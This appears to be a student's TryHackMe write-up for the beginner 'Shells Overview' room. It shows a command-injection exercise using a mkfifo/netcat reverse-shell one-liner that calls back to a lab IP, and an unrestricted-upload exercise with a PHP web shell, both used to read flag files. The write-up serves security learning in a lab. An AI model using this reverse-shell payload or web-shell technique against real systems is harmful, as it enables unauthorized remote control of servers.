# Shells Overview

# Info

- Author: Huan Phan Canh Dang
- Finish: 8/12/2025
- GitHub: harrybrwnie

# Overview

The Shells Overview room on TryHackMe is part of the Cyber Security 101 learning path, designed for beginners to understand the concept of shells in cybersecurity. Shells are command-line interfaces that allow interaction with an operating system, and in the context of cybersecurity, they are critical tools used by attackers to remotely control compromised systems. This room focuses on explaining different types of shells (reverse, bind, and web shells), their use cases, and how to implement them in controlled environments for penetration testing.

# Learning Objectives

- Understand the role of shells in offensive security and post-exploitation
- Differentiate between reverse shells, bind shells, and web shells
- Learn to exploit vulnerabilities (e.g command injection, unrestricted file upload) to deploy shells
- Gain insight into detecting and mitigating shells from a defensive perspectives

# Question 1

![image.png](img/image.png)

Get into the URL and observed that there is a page get file on server and output the hash of that file.

![image.png](img/image%201.png)

Try to get the hash of hello.txt file

![image.png](img/image%202.png)

Using this payload to get a reverse shell

```python
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.201.123.82 4444 >/tmp/f
```

On our machine, listen on port 4444 by using the nc command

![image.png](img/image%203.png)

Paste the payload into the form and send it to the server, then server will executes that payload

![image.png](img/image%204.png)

After had sent the payload, we get the reverse shell

Then investigated server and found there is a flag.txt at / directory and cat it out to get the flag

![image.png](img/image%205.png)

![image.png](img/image%206.png)

![image.png](img/image%207.png)

## Question 2

![image.png](img/image%208.png)

On our machine, create a shell.php file

In the file content, we use php to set a cmd parameter for server to implement

![image.png](img/image%209.png)

Then upload shell.php onto server

![image.png](img/image%2010.png)

By changing the URL to force server execute the code (.php) and set cmd to our command (cat /flag.txt) we get the flag

![image.png](img/image%2011.png)

![image.png](img/image%2012.png)